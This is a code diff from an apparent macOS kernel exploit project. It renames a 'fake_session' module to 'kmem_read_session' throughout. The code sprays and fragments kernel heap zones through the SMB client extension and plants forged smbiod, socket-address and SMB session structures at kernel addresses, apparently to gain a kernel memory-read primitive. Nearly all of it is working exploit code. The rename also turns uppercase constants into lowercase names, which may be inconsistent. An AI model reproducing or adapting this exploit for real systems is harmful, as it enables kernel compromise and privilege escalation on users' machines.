@@ -1,5 +1,5 @@
 //
-//  fake_session.c
+//  kmem_read_session.c
 //  xe_kmem
 //
 //  Created by admin on 2/22/22.
@@ -19,12 +19,12 @@
 #include "smb/client.h"
 #include "smb/params.h"
 
-#include "fake_session.h"
+#include "kmem_read_session.h"
 
 #define NUM_KEXT_32_FRAGMENTED_PAGES 1024
 
 
-struct fake_session {
+struct kmem_read_session {
     struct kmem_zkext_alloc_small_entry sock_addr_alloc;
     struct kmem_zkext_alloc_small_entry sock_addr_entry_alloc;
     struct kmem_zkext_alloc_small_entry iod_alloc;
@@ -38,7 +38,7 @@ struct fake_session {
 };
 
 
-void fake_session_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
+void kmem_read_session_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
     kmem_allocator_nrnw_t gap_allocator = kmem_allocator_nrnw_create(smb_addr);
     for (int i=0; i<NUM_KEXT_32_FRAGMENTED_PAGES; i++) {
         kmem_allocator_nrnw_allocate(nrnw_allocator, 32, 2);
@@ -48,10 +48,10 @@ void fake_session_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem_allo
 }
 
 
-void fake_session_build_sock_addr(fake_session_t session, const struct sockaddr_in* smb_addr) {
+void kmem_read_session_build_sock_addr(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
     xe_assert_cond(session->sock_addr_addr, ==, 0);
     
-    struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, (char*)&FAKE_SESSION_NIC_SADDR, sizeof(FAKE_SESSION_NIC_SADDR));
+    struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, (char*)&kmem_read_session_NIC_SADDR, sizeof(kmem_read_session_NIC_SADDR));
     uintptr_t fake_sock_addr_addr = entry.address + 8;
     
     session->sock_addr_addr = fake_sock_addr_addr;
@@ -60,7 +60,7 @@ void fake_session_build_sock_addr(fake_session_t session, const struct sockaddr_
 }
 
 
-void fake_session_build_sock_addr_entry(fake_session_t session, const struct sockaddr_in* smb_addr) {
+void kmem_read_session_build_sock_addr_entry(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
     xe_assert(session->sock_addr_addr != 0);
     xe_assert_cond(session->sock_addr_entry_addr, ==, 0);
     
@@ -77,7 +77,7 @@ void fake_session_build_sock_addr_entry(fake_session_t session, const struct soc
 }
 
 
-void fake_session_build_iod(fake_session_t session, const struct sockaddr_in* smb_addr) {
+void kmem_read_session_build_iod(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
     xe_assert(session->sock_addr_entry_addr != 0);
     xe_assert_cond(session->iod_addr, ==, 0);
     
@@ -92,7 +92,7 @@ void fake_session_build_iod(fake_session_t session, const struct sockaddr_in* sm
     assert(offsetof(struct smbiod, iod_gss.gss_spn) >= fake_iod_start);
     assert(offsetof(struct smbiod, iod_gss.gss_spn) + offsetof(struct complete_nic_info_entry, addr_list.tqh_first) + 8 < fake_iod_end);
     struct complete_nic_info_entry* fake_nic_entry = (struct complete_nic_info_entry*)((char*)&fake_iod + offsetof(struct smbiod, iod_gss.gss_spn));
-    fake_nic_entry->nic_index = FAKE_SESSION_NIC_INDEX;
+    fake_nic_entry->nic_index = kmem_read_session_NIC_INDEX;
     fake_nic_entry->addr_list.tqh_first = (struct sock_addr_entry*)session->sock_addr_entry_addr;
     
     assert(offsetof(struct smbiod, iod_ref_cnt) >= fake_iod_start);
@@ -124,59 +124,59 @@ void fake_session_build_iod(fake_session_t session, const struct sockaddr_in* sm
 }
 
 
-void fake_session_build_session(fake_session_t session, const struct sockaddr_in* smb_addr) {
+void kmem_read_session_build_session(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
     xe_assert(session->iod_addr != 0);
     xe_assert(session->nic_entry_addr != 0);
     xe_assert_cond(session->session_addr, ==, 0);
     
-    char fake_session[256];
-    bzero(fake_session, sizeof(fake_session));
+    char kmem_read_session[256];
+    bzero(kmem_read_session, sizeof(kmem_read_session));
     uintptr_t base = TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET;
     
-    *((uint64_t*)fake_session + 1) = 0x22000000;
-    *((uint64_t*)(fake_session + TYPE_SMB_SESSION_MEM_IOD_TAILQ_HEAD_OFFSET - base)) = session->iod_addr;
+    *((uint64_t*)kmem_read_session + 1) = 0x22000000;
+    *((uint64_t*)(kmem_read_session + TYPE_SMB_SESSION_MEM_IOD_TAILQ_HEAD_OFFSET - base)) = session->iod_addr;
     
-    struct session_network_interface_info* fake_nic_info = (struct session_network_interface_info*)(fake_session + TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET - base);
+    struct session_network_interface_info* fake_nic_info = (struct session_network_interface_info*)(kmem_read_session + TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET - base);
     fake_nic_info->interface_table_lck.opaque[1] = 0x22000000;
     fake_nic_info->client_nic_count = 1;
     fake_nic_info->client_nic_info_list.tqh_first = (struct complete_nic_info_entry*)session->nic_entry_addr;
     
     static_assert((TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET + offsetof(struct session_network_interface_info, client_if_blacklist_len) - TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET) <= 216, "");
     
-    struct kmem_zkext_alloc_small_entry fake_session_alloc = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, fake_session, 218);
-    uintptr_t fake_session_addr = fake_session_alloc.address + 8 - base;
+    struct kmem_zkext_alloc_small_entry kmem_read_session_alloc = kmem_zkext_alloc_small(smb_addr, 224, AF_INET, kmem_read_session, 218);
+    uintptr_t kmem_read_session_addr = kmem_read_session_alloc.address + 8 - base;
     
-    session->session_alloc = fake_session_alloc;
-    session->session_addr = fake_session_addr;
-    xe_log_debug("allocated fake_session at: %p", (void*)fake_session_addr);
-    xe_log_debug("memory for fake_session allocated at: %p", (void*)fake_session_alloc.address);
+    session->session_alloc = kmem_read_session_alloc;
+    session->session_addr = kmem_read_session_addr;
+    xe_log_debug("allocated kmem_read_session at: %p", (void*)kmem_read_session_addr);
+    xe_log_debug("memory for kmem_read_session allocated at: %p", (void*)kmem_read_session_alloc.address);
 }
 
 
-fake_session_t fake_session_create(const struct sockaddr_in* smb_addr) {
+kmem_read_session_t kmem_read_session_create(const struct sockaddr_in* smb_addr) {
     kmem_allocator_nrnw_t nrnw_allocator = kmem_allocator_nrnw_create(smb_addr);
-    fake_session_fragment_kext_32(smb_addr, nrnw_allocator);
+    kmem_read_session_fragment_kext_32(smb_addr, nrnw_allocator);
     
-    fake_session_t fake_session = malloc(sizeof(struct fake_session));
-    bzero(fake_session, sizeof(struct fake_session));
+    kmem_read_session_t kmem_read_session = malloc(sizeof(struct kmem_read_session));
+    bzero(kmem_read_session, sizeof(struct kmem_read_session));
     
-    fake_session_build_sock_addr(fake_session, smb_addr);
-    fake_session_build_sock_addr_entry(fake_session, smb_addr);
-    fake_session_build_iod(fake_session, smb_addr);
+    kmem_read_session_build_sock_addr(kmem_read_session, smb_addr);
+    kmem_read_session_build_sock_addr_entry(kmem_read_session, smb_addr);
+    kmem_read_session_build_iod(kmem_read_session, smb_addr);
     kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 8);
-    fake_session_build_session(fake_session, smb_addr);
+    kmem_read_session_build_session(kmem_read_session, smb_addr);
     
     kmem_allocator_nrnw_destroy(&nrnw_allocator);
-    return fake_session;
+    return kmem_read_session;
 }
 
-uintptr_t fake_session_get_addr(fake_session_t session) {
+uintptr_t kmem_read_session_get_addr(kmem_read_session_t session) {
     xe_assert(session->session_addr != 0);
     return session->session_addr;
 }
 
-void fake_session_destroy(fake_session_t* session_p) {
-    fake_session_t session = *session_p;
+void kmem_read_session_destroy(kmem_read_session_t* session_p) {
+    kmem_read_session_t session = *session_p;
     kmem_allocator_prpw_destroy(&session->sock_addr_alloc.element_allocator);
     kmem_allocator_prpw_destroy(&session->sock_addr_entry_alloc.element_allocator);
     kmem_allocator_prpw_destroy(&session->iod_alloc.element_allocator);
